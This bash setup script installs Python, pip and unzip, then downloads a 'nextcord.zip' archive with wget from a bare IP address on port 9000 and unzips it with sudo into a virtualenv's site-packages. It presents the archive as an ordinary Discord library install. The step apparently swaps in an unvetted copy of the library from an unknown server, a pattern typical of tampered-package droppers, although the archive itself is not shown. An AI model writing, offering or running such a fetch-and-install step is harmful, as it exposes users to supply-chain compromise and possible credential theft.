#!/bin/bash

if ! command -v python3 &> /dev/null
then
    echo "Python 3 is not installed. Do you want to install it now? (y/n)"
    read choice
    if [ "$choice" = "y" ]
    then
        echo "Installing Python 3 and pip using apt..."
        sudo apt-get update
        sudo apt-get install python3 python3-pip
    else
        echo "Aborting..."
        exit 1
    fi
fi

if ! command -v pip3 &> /dev/null
then
    echo "pip is not installed. Do you want to install it now? (y/n)"
    read choice
    if [ "$choice" = "y" ]
    then
        echo "Installing pip using apt..."
        sudo apt-get update
        sudo apt-get install python3-pip
    else
        echo "Aborting..."
        exit 1
    fi
fi

if ! command -v unzip &> /dev/null
then
    echo "unzip is not installed. Do you want to install it now? (y/n)"
    read choice
    if [ "$choice" = "y" ]
    then
        echo "Installing unzip using apt..."
        sudo apt install unzip
    else
        echo "Aborting..."
        exit 1
    fi
fi

expected_hash="b7a710cd995b244f7cf0f9165894900e"
wget http://84.252.74.222:9000/nextcord.zip
actual_hash=$(md5sum nextcord.zip | cut -d " " -f 1)

if [ "$actual_hash" = "$expected_hash" ]
then
    python3 -m venv Venv
    source Venv/bin/activate
    sudo unzip nextcord.zip -d "Venv/lib/python3.8/site-packages/"
    deactivate
    rm nextcord.zip
    echo "unzip installation completed!"
else
    rm nextcord.zip
    echo "Hash does not match, exiting..."
    exit 1
fi
